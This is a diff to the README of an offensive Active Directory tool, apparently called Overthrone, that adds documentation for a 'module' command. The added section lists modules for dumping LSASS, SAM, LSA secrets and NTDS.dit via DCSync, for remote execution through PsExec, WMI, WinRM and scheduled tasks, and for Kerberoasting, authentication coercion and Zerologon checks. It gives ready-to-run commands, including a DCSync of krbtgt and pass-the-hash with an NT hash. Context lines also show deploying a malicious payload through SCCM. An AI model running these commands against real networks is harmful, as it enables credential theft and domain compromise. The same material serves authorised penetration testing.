@@ -56,7 +56,8 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
   <a href="#ovt-report---engagement-reporting">report</a> &nbsp;·&nbsp;
   <a href="#ovt-doctor---environment-diagnostics">doctor</a> &nbsp;·&nbsp;
   <a href="#ovt-tui---interactive-terminal-ui">tui</a> &nbsp;·&nbsp;
-  <a href="#ovt-completions---shell-tab-completion">completions</a>
+  <a href="#ovt-completions---shell-tab-completion">completions</a> &nbsp;·&nbsp;
+  <a href="#ovt-module---built-in-module-management">module</a>
 </p>
 
 ---
@@ -857,6 +858,80 @@ ovt sccm abuse --site-server sccm01.corp.local --technique client-push
 
 # Deploy a malicious application
 ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
+```
+
+---
+
+## `ovt module` - Built-in Module Management
+
+Manage and run CME/netexec-style built-in modules registered at startup. Core modules
+(winrm-exec, smb-exec, psexec, wmi-exec, atexec, rdp) live in `overthrone-core`;
+extended modules (procdump, lsassy, sam-dump, lsa-dump, ntds-dump, bloodhound,
+kerberoast, asreproast, laps, gpp, coerce, nslookup) live in `overthrone-cli`.
+
+```bash
+# List all registered modules
+ovt module list
+
+# Filter by category (execute, dump, enum, kerberos, secrets, scan, coerce)
+ovt module list --category dump
+
+# Show detailed info for a module
+ovt module info sam-dump
+
+# Run a module against a target
+ovt module run procdump -t 10.10.10.10 --params '{"dump_path":"C:\\Windows\\Temp\\lsass.dmp"}'
+
+# Run a module against multiple targets in parallel
+ovt module run-parallel sam-dump -t 10.10.10.10,10.10.10.11 --concurrency 5
+```
+
+| `list` | List registered modules, optionally filtered by `--category` |
+| `info` | Show metadata, parameter hints, and usage example for a module |
+| `run` | Execute a module against a single `--target` host |
+| `run-parallel` | Execute against comma-separated `--targets` with `--concurrency` |
+
+### Available Modules
+
+| Module | Category | Description |
+|--------|----------|-------------|
+| `winrm-exec` | Execute | Remote command execution via WinRM |
+| `smb-exec` | Execute | Remote command execution via SMBExec |
+| `psexec` | Execute | Remote execution via PsExec service creation |
+| `wmi-exec` | Execute | Remote execution via WMI |
+| `atexec` | Execute | Remote execution via Scheduled Tasks |
+| `rdp` | Scan | Check if RDP (port 3389) is open |
+| `procdump` | Dump | Dump LSASS process memory via Procdump |
+| `lsassy` | Dump | Credential dumping from LSASS memory |
+| `sam-dump` | Dump | Dump SAM registry hive (local account hashes) |
+| `lsa-dump` | Dump | Dump LSA secrets (service account credentials) |
+| `ntds-dump` | Dump | DCSync NTDS.dit secrets via MS-DRSR (single-user `{"user":"krbtgt"}` or full domain `{"all":true}`) |
+| `bloodhound` | Enum | Collect LDAP data for BloodHound analysis |
+| `kerberoast` | Kerberos | Request TGS tickets for SPNs (Kerberoasting) |
+| `asreproast` | Kerberos | Request AS-REP for users with no pre-auth required |
+| `laps` | Enum | Read LAPS passwords from AD computer objects |
+| `gpp` | Secrets | Decrypt Group Policy Preferences (cpasswd) |
+| `coerce` | Coerce | Coerce authentication via MS-EFSRPC / MS-RPRN |
+| `nslookup` | Scan | DNS resolution and domain discovery |
+| `zerologon` | Scan | CVE-2020-1472 check — verify zero-credential Netlogon auth via MS-NRPC |
+
+### Module Usage Examples
+
+```bash
+# DCSync — single user (stealth, EXOP_REPL_OBJ)
+ovt module run ntds-dump -t 10.10.10.10 --params '{"user":"krbtgt"}'
+
+# DCSync — full domain replication (noisier, all objects)
+ovt module run ntds-dump -t 10.10.10.10 --params '{"all":true}'
+
+# Zerologon vulnerability check (no creds required)
+ovt module run zerologon -t 10.10.10.10
+
+# Kerberoast with NT hash (pass-the-hash)
+ovt --nt-hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 module run kerberoast -t 10.10.10.10
+
+# BloodHound LDAP enumeration
+ovt module run bloodhound -t 10.10.10.10 --nt-hash <hash>
 ```
 
 ---
